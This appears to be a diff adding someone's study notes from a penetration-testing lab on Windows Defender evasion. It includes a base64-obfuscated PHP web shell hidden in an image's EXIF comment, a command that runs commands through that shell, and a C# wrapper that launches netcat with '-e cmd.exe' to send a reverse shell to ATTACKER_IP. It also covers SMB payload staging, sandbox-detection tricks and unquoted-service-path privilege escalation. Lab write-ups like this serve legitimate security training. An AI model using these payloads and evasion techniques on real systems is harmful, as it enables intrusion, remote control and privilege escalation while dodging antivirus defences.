@@ -1,0 +1,295 @@
+
+
+Antivirus Evasion
+-------------------
+
+Primary types of AV evasions:
+	- On-Disk Evasion
+		- Eg. Getting an executable and running the executable
+
+	- In-Memory Evasion
+		- Eg. Getting a PS module and then importing it into powershell and then run it.
+
+
+Note: Bypassing AV through IN-Memory evasion requires to trick AMSI (Anti-Malware Scan Interface)
+	- A new interface implemented by microsoft to scan for in-memory exploitable/dangerous scripts/processes.
+
+- We are not going to expect any other anti-virus to be installed on the target machine in this room. Our primary target is to evade the windows defender only.
+
+- If we already have a shell on the target, we may also be able to use programs such as SharpEDRChecker and Seatbelt to identify the antivirus solution installed.
+
+	- Seatbelt: https://github.com/GhostPack/Seatbelt
+	- SharpEDRChecker: https://github.com/PwnDexter/SharpEDRChecker
+
+Note: We should always disable any kind of cloud-based protection in the AV settings (potentially by outright disconnecting the VM from the internet) so that the AV doesn't upload our carefully crafted payloads to a server somewhere for analysis, destroying all our hard work. Once we have a working payload, we can then deploy it against the target!
+
+Note: AV Evasion usually involves some form of obfuscation when it comes to payloads. This could mean anything from moving things around in the exploit and changing variable names, to encoding aspects of the script, to outright encrypting the payload and writing a wrapper to decrypt and execute the code section-by-section. The aim is to switch things enough that the AV software is unable to detect anything bad.
+
+
+
+AV Detection
+==============
+
+- There are 2 types how an antivirus detects a malware or a suspicious activity:
+	- Static Detection
+		- Signature and Pattern Matching (Generally fast)
+
+	- Dynamic Detection:
+		- Detects pattern in file execution.
+
+Note: The static detection is obviously faster due to reading a file while in a non-executing state.
+
+Static Detection
+------------------
+
+	Static detection depends on hashsums of a file. If the file matches the hashsum in it's database. It is flagged and reported to the user.
+		- The good thing with hashsums is that hashsums can be something that can be easily altered i.e. by even a little change in the file the resulting hashsum will completely change.
+
+		- Another way of static detection can be through byte/string matching.
+
+
+Dynamic/Behavioural detection
+------------------------------
+
+	This type of detection is dependent upon a file's executing activities. Like the AV will check what are the steps a particular executable is trying to perform.
+		- changing registry entries or making connection to a bad website.
+
+		- The suspicious program is kept separately (particularly in a sandbox environment) and is monitored for any other suspiciouns... If found, the app is quarantined and flagged as malware.
+
+			- Well, if we could make our program(malware) detect if whether it's been deployed in a sandbox environment... Then, we can program it to exit at such conditions... So that the AV doesn't flag it.
+
+			- On other note, detecting sandbox environments is pretty easy. Eg. A machine with no GUI and no fans attached to it... Is more likely to be a VM or another sandbox environment.
+				- We can also detect a VM running by services running in that sandbox environment. For eg. If VMtools (service for vmware)
+
+
+- Static analysis can be easily bypassed by using some random code that does nothing, just to fool the checksum.
+
+- ONE MAJOR WAY TO BYPASS THROUGH THE BEHAVIORAL ANALYSIS BY AV, We can use a password protected binary... Which can only be executed by the user who knows the password.
+
+- Dynamic detection is more better than static one... The only drawback... It takes up a lot of computer resources.
+
+Resources for auto-detecting bad behaviours of a file in sandbox environment, and update the list of it:
+	https://resources.cmnatic.co.uk/Presentations/Dissertation/
+
+- AV updated it's databases, that being said... for any behavioural suspicious or statically identified application gets synced across different service provider servers.
+
+	- This rapid sharing of information allows AV providers to stay ahead of bad actors (a good thing), but also obviously adds an extra complication into our job as Ethical Hackers.
+
+- VirusTotal is a site that deploys the malwares in a sandbox environment as well as checks whether it is matching any current hashes in their databases. A good site to test your malwares after you create them.
+
+
+PHP Obfuscation
+-----------------
+
+- The basic terminology hereis that we are going to create a basic php payload. And then obfuscate it later (either manually or by using one of the tools available online). 
+
+- The test payload could be: 
+	
+	<?php
+    \$cmd = $_GET["wreath"];
+    if(isset($cmd)){
+        echo "<pre>" . shell_exec($cmd) . "</pre>";
+    }
+    die();
+	?>
+
+- This payload is a longer version example of php one liner: ```<?php system($_GET["cmd"]);?>``` for the following reasons:
+
+	- If we're obfuscating it then it will become a one liner anyway.
+	- Anything different is good when it comes to AV evasion.
+
+- There are a variety of measures we could take here, including but not limited to:
+
+    - Switching parts of the exploit around so that they're in an unusual order
+    - Encoding all of the strings so that they're not recognisable
+    - Splitting up distinctive parts of the code (e.g. shell_exec($_GET[...])).
+
+- Note you can also manually obfuscate this script or use this [site](https://www.gaijin.at/en/tools/php-obfuscator), to obfuscate your php scripts.
+
+- Obfuscated string: 
+
+	<?php $m0=$_GET[base64_decode('d3JlYXRo')];if(isset($m0)){echo base64_decode('PHByZT4=').shell_exec($m0).base64_decode('PC9wcmU+');}die();?>
+
+Note: This works as the same payload before, but enough to fool the windows defender.
+
+- Also note that this is passed into a bash command so the dollar sign may execute on it's own... We do need to escape the $ sign up there...
+
+	The final payload would like this:
+
+		<?php \$m0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$m0)){echo base64_decode('PHByZT4=').shell_exec(\$m0).base64_decode('PC9wcmU+');}die();?>
+
+
+exiftool -Comment="<?php \$m0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$m0)){echo base64_decode('PHByZT4=').shell_exec(\$m0).base64_decode('PC9wcmU+');}die();?>" > test.jpg
+
+Command Execution at .100 with:
+	
+	iwr http://10.200.90.100/resources/uploads/index.png.php?wreath=<COMMAND> -Method 'GET' -Headers @{'Authorization' = 'Basic dGhvbWFzOmk8M3J1Ynk='}
+
+
+Just enter the command to execute in place of <COMMAND>
+
+Compiling Netcat and Reverse Shells
+-------------------------------------
+
+Reverse shell options:
+	- Powershell, but windows defender may not allow; can use obfuscation
+	- PHP reverse shell, but defender... Can use obfuscation
+	- msfvenom executables... Different from the normal apps and can be easily marked unwanted by defender.
+		- Following are the references that can be used to obfuscate msfvenom executables...
+			- Veil-Framework: https://www.veil-framework.com/ (find the framework on github)
+			- shellter(old though)
+
+Note: There are 100s of version of netcat available online... Some marked by defender... But others... may allow. So one version that can be used is the following:
+	- https://github.com/int0x33/nc.exe
+		- This repository already contains pre-compiled netcat binaries for both 32 and 64 bit systems.
+
+
+- Cross Compilation: The idea is to compile source code into a working program to run on a different platform.
+	- Note: It is preferred to avoid it... As it may give out some errors.
+
+- We cross compile x64 Windows programs on linux using the mingw-w64 package (for x64 systems).
+	- It is almost same as compiling apps in terminal with gcc.
+	- You can install it using:
+
+		sudo apt install mingw-w64
+
+- About that repo we cloned earlier, delete those applications, and re-compile the binaries using `make`.
+	- Make sure you edit the first line in the `Makefile` to `CC=x86_64-w64-mingw32-gcc`, as this specifies that we want to compile a 64bit binary.
+
+	- Now when the make command is invoked. The nc.exe (64 bit) binary is compiled using the mingw64 bit compiler downloaded on the linux.
+
+To get nc.exe to the host machine... We can try the following
+	- Powershell might work but with AMSI in play it's a risk...
+	- certutil.exe or curl is an option
+		- Certutil is a default Windows tool that is used to (amongst other things) download CA certificates. This also makes it ideal for file transfers, but Defender flags this as malicious. 
+
+
+Privescalation on the 3rd machine
+-----------------------------------
+
+Note: The defender is still on, so post exploit enumeration task can be risky too:
+	- Defender may be able to identify a regular copy of winpeas.exe. But may not be able to identify the .bat version of it or obfuscated version of it's .exe
+	- We can try to upload a powershell script, but importing it into memory may alert defender.
+
+
+- Start with a few known easy manual enumeration
+
+- The following command lists all the services present in the OS, excluding the ones that are in C:\Windows folder.
+
+	wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
+
+- We found an unquoted service path, which we can easily exploit.
+
+Privilege Escalation
+----------------------
+
+We have an unquoted service path attack vector... Which help us evade the AV detection. Because it's a service already running in the system, and we will be using the service itself to escalate privileges. 
+
+- All we need is one very small "wrapper" program that activates the netcat binary that we already have on the target.
+	- What we need is to write a small executable that executes a system command: activating netcat and sending us a reverse shell as the owner of the service
+
+NOTE: IDEALLY WE WOULD WRITE A FULL C# SERVICE FILE THAT WOULD INTEGRATE SEAMLESSLY WITH THE WINDOWS SERVICE MANAGEMENT SYSTEM.
+
+Also, the above method discussed is good to bypass AV. But, it's worth noting that it could be captured by any other IDS installed by the organisation.
+
+- For the exercise, to privilege escalate we are going to write a simple program in C# to privesc.
+	- Ideally it is recommended to use Visual Studio... But to compile the C# on linux, mono dotnet core compiler would work just fine. 
+
+Coding Practical
+-----------------
+
+- sudo apt install mono-devel
+
+- The first thing we need to do is add our "imports". These allow us to use pre-defined code from other "namespaces"
+	
+```csharp
+using System;
+using System.Diagnostics;
+```
+
+- Next we need to initialise a namespace and class for the program, and then we can write the code that will call netcat which goes inside the Main() function.
+
+```csharp
+namespace Wrapper{
+    class Program{
+        static void Main(){
+            Process proc = new Process();
+			ProcessStartInfo procInfo = new ProcessStartInfo("c:\\windows\\temp\\nc-USERNAME.exe", "ATTACKER_IP ATTACKER_PORT -e cmd.exe");
+        }
+    }
+}
+```
+With the objects created, we can now configure the process to not create it's own GUI Window when starting:
+
+	```procInfo.CreateNoWindow = true;```
+
+Finally, we attach the ProcessStartInfo object to the process, and start the process!
+	```csharp
+	proc.StartInfo = procInfo;
+	proc.Start();
+	```
+
+The final code will be like:
+	
+```csharp
+using System;
+using System.Diagnostics;
+
+namespace Wrapper{
+    class Program{
+        static void Main(){
+            Process proc = new Process();
+			
+			ProcessStartInfo procInfo = new ProcessStartInfo("c:\\windows\\temp\\nc-USERNAME.exe", "ATTACKER_IP ATTACKER_PORT -e cmd.exe");
+			
+			procInfo.CreateNoWindow = true;
+			proc.StartInfo = procInfo;
+			proc.Start();
+        }
+    }
+}
+```
+- We can now compile our program using the Mono `mcs` compiler
+
+	mcs Wrapper.cs
+
+Note: Don't forget that we can use SMB to transfer too, using Impacket.
+	- Impacket is a python library that makes it very easy to interact with a wide variety of Windows services from linux.
+
+		sudo git clone https://github.com/SecureAuthCorp/impacket /opt/impacket && cd /opt/impacket && sudo pip3 install .
+
+- We can use the following command to create a server on our IP, serving a share called "share" in the current directory. 
+	- As Impacket uses SMBv1 by default, we need to specify that is use SMBv2 in order for the relatively up-to-date target to accept it. 
+	- We can set username and password for connections to the server.
+
+		NOTE: THIS IS DUE TO SECURITY POLICIES ON THE TARGET REQUIRING CONNECTIONS TO BE AUTHENTICATED.
+
+	sudo python3 /opt/impacket/examples/smbserver.py share . -smb2support -username user -password s3cureP@ssword
+
+- To authenticate into our attacker machine from target machine we can use the following command:
+
+	net use \\ATTACKER_IP\share /USER:user s3cureP@ssword
+
+	Then to copy files from the attacker machine to local machine, we can use:
+
+	copy \\ATTACKER IP\share\Wrapper.exe %TEMP%\wrapper-USERNAME.exe
+
+NOTE: It is often useful to just leave an SMB server running in the background when working with Windows targets. We will use this server later, so let's leave it up for now. But to prevent any errors, we should disconnect from windows for the time being.
+
+- There is not much need of explaining unquoted service path exploit... As most of it is already known by me...
+
+	- Though there are 2 options to make our exploit work. Either we can restart the entire system or, we can restart the service itself.
+
+- You can start and stop a windows service using the following commands:
+	
+	sc stop <service name>
+	sc start <service name>
+
+- Clearing up after exploits is a good habit to get into.
+
+
+``````````````````````````````````````````````````````````````````
+Research how to write A REAL WINDOWS SERVICE EXECUTABLE IN C# AND TRY TO CREATE A WRAPPER (OR EVEN A FULL REVERSE SHELL!) THAT DOESN'T CAUSE THE SC START COMMAND TO ERROR OUT.
+
+Checkout the following repo: https://github.com/mattymcfatty/unquotedPoC/blob/master/SimpleService.cs 
+```````````````````````````````````````````````````````````````````
